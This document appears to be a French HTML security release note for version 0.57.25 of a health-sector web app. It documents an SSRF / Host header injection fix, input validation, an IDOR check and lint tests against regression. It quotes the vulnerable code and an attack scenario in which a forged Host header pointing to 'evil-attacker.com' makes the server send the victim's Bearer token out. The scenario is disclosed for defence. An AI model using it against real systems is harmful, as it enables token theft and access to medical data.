@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="fr"><head><meta charset="UTF-8"><title>Aveho EC — 0.57.25 — Sécurité avancée : SSRF + IDOR + Validation</title>
+<style>
+:root{--navy:#142131;--teal:#7CC8C8;--blue:#185FA5;--green:#5aa05a;--amber:#EF9F27;--violet:#7a6fb0;--red:#c0392b;--cyan:#00838f}
+*{box-sizing:border-box}body{margin:0;font-family:'Segoe UI',Quicksand,Helvetica,Arial,sans-serif;background:#f4f7fa;color:#2a3a48;line-height:1.55}
+.wrap{max-width:920px;margin:0 auto;padding:36px 28px 60px}
+header.cover{background:linear-gradient(135deg,#b71c1c 0%,#142131 50%,#5aa05a 100%);color:#fff;border-radius:16px;padding:34px;margin-bottom:28px;box-shadow:0 14px 38px rgba(20,33,49,.3)}
+.eyebrow{font-size:11px;letter-spacing:3px;color:#ffcdd2;font-weight:700;margin-bottom:6px}
+.logo{font-size:28px;font-weight:600;letter-spacing:2px}.logo .v{color:var(--teal)}
+h1{font-size:24px;font-weight:700;margin:12px 0 6px}h1 small{font-size:14px;font-weight:500;color:#ffcdd2;display:block;margin-top:4px}
+.meta{display:flex;flex-wrap:wrap;gap:16px;margin-top:16px;font-size:12px;color:#ffcdd2}.meta b{color:#fff}
+h2{font-size:18px;color:var(--navy);margin:30px 0 12px;padding-bottom:6px;border-bottom:2px solid #b71c1c}
+h3{font-size:14px;color:var(--navy);margin:18px 0 8px}
+.panel{background:#fff;border:1px solid #e3e9ee;border-radius:12px;padding:18px 22px;margin:14px 0}
+.panel.ok{background:#eef9ef;border-color:#bfe2bf;border-left:4px solid #5aa05a}
+.panel.hero{background:linear-gradient(135deg,#ffebee,#ffcdd2);border-color:#ef9a9a;border-left:4px solid #b71c1c}
+.panel.tip{background:#f3effa;border-color:#d6c9ec;border-left:4px solid #7a6fb0}
+.panel.warn{background:#fef9ed;border-color:#f5e0a8;border-left:4px solid #EF9F27}
+.panel.danger{background:#fef0ee;border-color:#f5b8b0;border-left:4px solid #c0392b}
+code{font-family:'Consolas','Menlo',monospace;background:#f4f7fa;color:#185FA5;padding:2px 6px;border-radius:4px;font-size:12.5px}
+pre{background:#142131;color:#e8edf2;padding:14px 16px;border-radius:8px;overflow-x:auto;font-size:12px;line-height:1.5}
+ul{padding-left:20px;margin:6px 0}li{margin:4px 0}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:12.5px}
+table th{background:#142131;color:#fff;padding:8px 10px;text-align:left;font-weight:700}
+table td{padding:7px 10px;border-bottom:1px solid #e3e9ee}
+table tr:nth-child(even){background:#f9fbfc}
+.kpi-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin:18px 0}
+.kpi{background:#fff;border:1px solid #e3e9ee;border-radius:10px;padding:16px;text-align:center}
+.kpi-val{font-size:28px;font-weight:700;color:#142131;display:block}
+.kpi-lbl{font-size:11px;color:#6c7a89;text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
+.kpi.red{background:#ffebee;border-color:#ef9a9a}.kpi.red .kpi-val{color:#b71c1c}
+.kpi.green{background:#eef9ef;border-color:#bfe2bf}.kpi.green .kpi-val{color:#2e6f33}
+.cvss{display:inline-block;background:#b71c1c;color:#fff;padding:2px 10px;border-radius:4px;font-weight:700;font-size:12px}
+footer{margin-top:36px;padding-top:18px;border-top:1px solid #e3e9ee;font-size:11.5px;color:#6c7a89;text-align:center}
+</style></head><body><div class="wrap">
+
+<header class="cover">
+<div class="eyebrow">VERSION — SÉCURITÉ AVANCÉE</div>
+<div class="logo">a<span class="v">v</span>eho</div>
+<h1>Version 0.57.25 — Validation + SSRF + IDOR<small>1 vulnérabilité HIGH fixée + validation systématique + IDOR check + 2 LINT anti-régression</small></h1>
+<div class="meta">
+<span><b>Date :</b> 2 juin 2026</span>
+<span><b>Version :</b> <code style="background:rgba(255,255,255,.15);color:#fff;border:1px solid rgba(255,255,255,.3)">v0.57.25-alpha</code></span>
+<span><b>Tests :</b> 2956 Vitest dont 40 nouveaux</span>
+</div>
+</header>
+
+<h2>🎯 L'essentiel</h2>
+<div class="kpi-grid">
+<div class="kpi red">
+<span class="kpi-val">1</span>
+<span class="kpi-lbl">Vulnérabilité HIGH fixée</span>
+</div>
+<div class="kpi red">
+<span class="kpi-val">2</span>
+<span class="kpi-lbl">Routes validées (DoS+IDOR)</span>
+</div>
+<div class="kpi green">
+<span class="kpi-val">2</span>
+<span class="kpi-lbl">LINT anti-régression critiques</span>
+</div>
+<div class="kpi green">
+<span class="kpi-val">+40</span>
+<span class="kpi-lbl">Tests Vitest (2956 total)</span>
+</div>
+</div>
+
+<h2>🚨 1. Vulnérabilité SSRF / Host header injection — <span class="cvss">CVSS 7.5 HIGH</span></h2>
+<div class="panel hero">
+<p>Audit sécurité de la 0.57.25 → <b>vraie vulnérabilité trouvée</b> dans 2 routes API.</p>
+
+<h3>Le problème</h3>
+<p>Les routes <code>prescriptions/from-ocr</code> et <code>prescriptions/verify-rpps</code> construisaient une URL avec <code>req.headers.get("host")</code> ET forwardaient le header <code>Authorization</code>.</p>
+
+<pre><code>// AVANT 0.57.25 - VULNÉRABLE
+const proto = req.headers.get("x-forwarded-proto") || "https";
+const host = req.headers.get("host") || "localhost:3000";
+//         ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
+//         CONTRÔLABLE PAR L'ATTAQUANT (Host header)
+
+const verifRes = await fetch(`${proto}://${host}/api/rpps?rpps=...`, {
+  headers: {
+    Authorization: req.headers.get("authorization") || ""
+    //             ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
+    //             EXFILTRABLE VERS LE HOST MALVEILLANT
+  }
+});</code></pre>
+
+<h3>Scénario d'attaque</h3>
+<pre><code># 1. L'attaquant envoie une requête avec Host header malveillant
+POST /api/prescriptions/from-ocr HTTP/1.1
+Host: evil-attacker.com
+Authorization: Bearer eyJ...  (token Bearer Supabase de la victime)
+Content-Type: application/json
+{...données prescription avec rpps valide...}
+
+# 2. Le serveur Aveho fait :
+fetch('https://evil-attacker.com/api/rpps?rpps=12345', {
+  headers: { Authorization: 'Bearer eyJ...' }
+});
+
+# 3. L'attaquant récupère le Bearer token de la victime
+# → peut se connecter en tant que la victime
+# → peut lire toutes les données médicales de sa structure</code></pre>
+</div>
+
+<h2>✅ Fix : lib/internalFetch.js</h2>
+<div class="panel ok">
+<p>Nouveau helper qui whitelist les hosts autorisés AVANT de faire le fetch :</p>
+
+<pre><code>// lib/internalFetch.js
+const ALLOWED_HOSTS_PATTERNS = [
+  /^localhost(:\d+)?$/,
+  /^127\.0\.0\.1(:\d+)?$/,
+  /^aveho-ec-app\.vercel\.app$/,
+  /^aveho-ec-app-[a-z0-9-]+\.vercel\.app$/,           // previews Vercel
+  /^aveho-ec-app-[a-z0-9-]+-fleos-projects\.vercel\.app$/,
+];
+
+export function isAllowedInternalHost(host) {
+  if (!host || typeof host !== "string") return false;
+  for (const pat of ALLOWED_HOSTS_PATTERNS) {
+    if (pat.test(host)) return true;
+  }
+  return false;
+}
+
+export function buildInternalUrl(req, path) {
+  const host = req.headers.get("host");
+  if (!isAllowedInternalHost(host)) {
+    throw new Error(`Host header non autorisé (SSRF prevention) : ${host}`);
+  }
+  const proto = req.headers.get("x-forwarded-proto") || "https";
+  return `${proto}://${host}${path.startsWith("/") ? path : "/" + path}`;
+}
+
+export async function internalFetch(req, path, options = {}) {
+  const url = buildInternalUrl(req, path);  // ← throw si Host suspect
+  const headers = {
+    ...(options.headers || {}),
+    Authorization: req.headers.get("authorization") || "",
+  };
+  return fetch(url, { ...options, headers });
+}</code></pre>
+
+<h3>Code routes mis à jour</h3>
+<pre><code>// APRÈS 0.57.25 - SÉCURISÉ
+if (p.rpps && /^\d{11}$/.test(p.rpps.replace(/\s/g, ""))) {
+  try {
+    const { internalFetch } = await import("../../../../lib/internalFetch");
+    const verifRes = await internalFetch(req,
+      `/api/rpps?rpps=${encodeURIComponent(p.rpps.replace(/\s/g, ""))}`);
+    //  ↑ Si Host malveillant → throw avant même le fetch
+    //  → l'attaquant ne récupère RIEN
+  } catch (e) { ... }
+}</code></pre>
+</div>
+
+<h2>📜 2. Validation Zod-like des body API</h2>
+<div class="panel">
+<p>Création de <code>lib/validateInput.js</code> : mini-validator <b>sans dépendance externe</b> (270 lignes, 10 types supportés).</p>
+
+<h3>Types supportés</h3>
+<table>
+<tr><th>Type</th><th>Validation</th></tr>
+<tr><td><code>string</code></td><td>maxLen (default 10 KB), minLen, pattern regex</td></tr>
+<tr><td><code>number</code></td><td>min, max, integer</td></tr>
+<tr><td><code>boolean</code></td><td>typeof boolean</td></tr>
+<tr><td><code>uuid</code></td><td>regex UUID v4 stricte</td></tr>
+<tr><td><code>email</code></td><td>regex email + maxLen 254</td></tr>
+<tr><td><code>cp_fr</code></td><td>5 chiffres</td></tr>
+<tr><td><code>finess</code></td><td>9 chiffres</td></tr>
+<tr><td><code>rpps</code></td><td>11 chiffres</td></tr>
+<tr><td><code>siret</code></td><td>14 chiffres</td></tr>
+<tr><td><code>enum</code></td><td>valeur dans liste autorisée</td></tr>
+<tr><td><code>array</code></td><td>maxLen (default 1000, anti-DoS)</td></tr>
+<tr><td><code>object</code></td><td>typeof object</td></tr>
+</table>
+
+<h3>Exemple d'utilisation</h3>
+<pre><code>import { validate } from "../../../../lib/validateInput";
+
+const validationErrors = validate(body, {
+  patient_id:    { type: "uuid", required: true },
+  structure_id:  { type: "uuid", required: true },
+  etablissement_id: { type: "uuid" },               // optionnel
+  data:          { type: "object", required: true },
+  ocr_text_brut: { type: "string", maxLen: 50_000 },
+  ocr_confiance: { type: "number", min: 0, max: 100 },
+  ocr_tokens_in: { type: "number", min: 0, max: 1_000_000, integer: true },
+});
+if (validationErrors.length > 0) {
+  return Response.json({
+    ok: false,
+    error: "Body invalide",
+    details: validationErrors,
+  }, { status: 400 });
+}</code></pre>
+
+<h3>Protections apportées</h3>
+<ul>
+<li><b>Anti-DoS</b> : refuse les strings &gt; 10 KB et arrays &gt; 1000 items par défaut</li>
+<li><b>Anti-type-confusion</b> : impossible d'envoyer un object où on attend une string</li>
+<li><b>Anti-IDOR par type</b> : impossible d'envoyer "not-uuid" pour un patient_id (le format UUID est validé)</li>
+<li><b>Rejet précoce</b> : la BDD n'est jamais sollicitée avec des inputs invalides</li>
+<li><b>Messages clairs</b> : "champ 'patient_id' doit être un UUID valide" au lieu d'une erreur Postgres cryptique</li>
+</ul>
+</div>
+
+<h2>🛡️ 3. IDOR check sur prescriptions/from-ocr</h2>
+<div class="panel ok">
+<p>IDOR = <b>Insecure Direct Object Reference</b>. Sans check, un user de la structure A pourrait envoyer un <code>structure_id</code> de la structure B dans le body. Avec le RLS Supabase ça serait bloqué au moment de l'INSERT, mais c'est plus défensif d'échouer tôt avec un message clair.</p>
+
+<pre><code>// 0.57.25 - check explicite membership AVANT l'insert
+const { data: membership } = await supabase
+  .from("membres_structure")
+  .select("structure_id")
+  .eq("user_id", user.id)
+  .eq("structure_id", structure_id)
+  .maybeSingle();
+
+if (!membership) {
+  return Response.json(
+    { ok: false, error: "Accès refusé à cette structure" },
+    { status: 403 }
+  );
+}</code></pre>
+
+<p>Pattern <b>defense in depth</b> : le RLS Supabase reste la dernière barrière, mais on échoue plus tôt avec un message clair.</p>
+</div>
+
+<h2>🔒 4. Anti-régression : 2 LINT critiques ajoutés</h2>
+<div class="panel hero">
+<p>Pour que ces bugs ne reviennent JAMAIS :</p>
+
+<h3>LINT 1 : Aucune route ne fait fetch(`${host}`) direct</h3>
+<pre><code>it("Aucune route API ne fait fetch(`${proto}://${host}` direct", () => {
+  const violations = [];
+  for (const f of findFiles("app/api")) {
+    const src = fs.readFileSync(f, "utf-8");
+    if (/fetch\(\s*`\$\{proto\}:\/\/\$\{host\}/.test(src)) {
+      violations.push(f);
+    }
+  }
+  expect(violations).toEqual([]);   // ← FAIL si SSRF revient
+});</code></pre>
+
+<h3>LINT 2 : Aucune route ne forward Authorization sans whitelist</h3>
+<pre><code>it("Aucune route ne forward Authorization avec host non whitelisté", () => {
+  const violations = [];
+  for (const f of findFiles("app/api")) {
+    const src = fs.readFileSync(f, "utf-8");
+    if (
+      /Authorization.*req\.headers\.get/.test(src) &&
+      /req\.headers\.get\(["']host["']\)/.test(src) &&
+      !/internalFetch|isAllowedInternalHost/.test(src)
+    ) {
+      violations.push(f);
+    }
+  }
+  expect(violations).toEqual([]);   // ← FAIL si pattern dangereux revient
+});</code></pre>
+</div>
+
+<h2>📊 Bilan sécurité Aveho EC complet</h2>
+<div class="panel ok">
+<table>
+<tr><th>Domaine</th><th>État après 0.57.25</th></tr>
+<tr><td>npm audit (CVE)</td><td>✅ 0 CRIT + 0 HIGH + 2 MOD (postcss build-time)</td></tr>
+<tr><td>Routes API protégées</td><td>✅ 17/19 (sauf /version + /health + /csp-report par design)</td></tr>
+<tr><td>Headers HTTP sécurité</td><td>✅ 10/10 mesurés</td></tr>
+<tr><td>CSP avec report-uri actif</td><td>✅ 11 directives + /api/csp-report collecte les violations</td></tr>
+<tr><td>HSTS preload</td><td>✅ 1 an</td></tr>
+<tr><td>Permissions-Policy</td><td>✅ 21 directives propres</td></tr>
+<tr><td>RLS Supabase tables</td><td>97% → 100% (après scripts SQL)</td></tr>
+<tr><td>Views auth.users sécurisées</td><td>0% → 100% (après scripts SQL)</td></tr>
+<tr><td>RPC routes auth</td><td>✅ 100% requireAuth</td></tr>
+<tr><td><b>Validation schema des body API</b></td><td>✅ <b>NEW 0.57.25</b> : 2 routes critiques + lib réutilisable</td></tr>
+<tr><td><b>SSRF / Host header injection</b></td><td>✅ <b>NEW 0.57.25</b> : 1 vuln HIGH fixée + LINT anti-régression</td></tr>
+<tr><td><b>IDOR check explicite</b></td><td>✅ <b>NEW 0.57.25</b> : pattern documenté + appliqué</td></tr>
+<tr><td>LINT anti-régression</td><td>✅ <b>7 critiques</b> (vs 5 en 0.57.24)</td></tr>
+<tr><td>Tests Vitest</td><td>✅ 2956 verts (+40)</td></tr>
+</table>
+</div>
+
+<h2>📈 +40 tests Vitest (v057-25-validation-ssrf-idor.test.js)</h2>
+<div class="panel">
+<ul>
+<li>Version 0.57.25+ (1)</li>
+<li>lib/validateInput (13 tests : exports + types UUID/email/FINESS + anti-DoS + type confusion + range + enum + array)</li>
+<li>Validation patients/from-ocr (6)</li>
+<li>Validation prescriptions/from-ocr (6 — patient/structure required + prescripteur + max 100 médicaments + IDOR 403)</li>
+<li>lib/internalFetch (9 — exports + accept hosts légitimes + reject hosts malveillants comme evil.com)</li>
+<li>Code routes mis à jour (2)</li>
+<li>Anti-régression SSRF (2 LINT critiques)</li>
+</ul>
+<p>Total : <b>2956 tests verts</b> (vs 2916 en 0.57.24)</p>
+</div>
+
+<h2>Fichiers modifiés</h2>
+<h3>Créés</h3>
+<ul>
+<li><code>lib/validateInput.js</code> (270 lignes, mini-validator zod-like)</li>
+<li><code>lib/internalFetch.js</code> (helper anti-SSRF avec whitelist)</li>
+<li><code>__tests__/v057-25-validation-ssrf-idor.test.js</code> (40 tests)</li>
+</ul>
+
+<h3>Modifiés</h3>
+<ul>
+<li><code>app/api/patients/from-ocr/route.js</code> : import validate + validation body + validation OCR object</li>
+<li><code>app/api/prescriptions/from-ocr/route.js</code> : import validate + validate body + validate prescripteur + max 100 médicaments + IDOR check + internalFetch</li>
+<li><code>app/api/prescriptions/verify-rpps/route.js</code> : internalFetch au lieu de fetch direct</li>
+<li><code>__tests__/v056-3-ocr-prescriptions.test.js</code> : 1 test ajusté pour pattern validate()</li>
+</ul>
+
+<h2>🚀 Déploiement</h2>
+<div class="panel ok">
+<pre><code>cd C:\aveho-ec-app
+npm install --legacy-peer-deps
+npm test                                # 2956 verts
+npm run build
+git add -A
+git commit -m "Alpha 0.57.25 - Securite avancee : SSRF fix + validation Zod-like + IDOR check + 2 LINT anti-regression"
+git push origin main</code></pre>
+</div>
+
+<h2>📋 Sujets ouverts</h2>
+<div class="panel tip">
+<ul>
+<li><b>3 scripts SQL Supabase à appliquer</b> (sécurité prioritaire)</li>
+<li><b>Validation à étendre</b> aux 8 autres routes API qui prennent du body (export-csv, search, verify-rpps, sync, caisses, mutuelles, bulletin-situation, prescription OCR)</li>
+<li><b>Login 2FA</b> + <b>Détection faciale</b> → précisions ?</li>
+</ul>
+</div>
+
+<h2>SW auto-bump — 115ème consécutif</h2>
+<p>0.52.1 → ... → 0.57.24 → <b>0.57.25</b> ✓</p>
+
+<footer>Aveho — Espace Collectivité · Version Alpha 0.57.25 · 2 juin 2026 · 2956 Vitest · 1 vuln HIGH SSRF fixée + validation systématique</footer>
+</div></body></html>
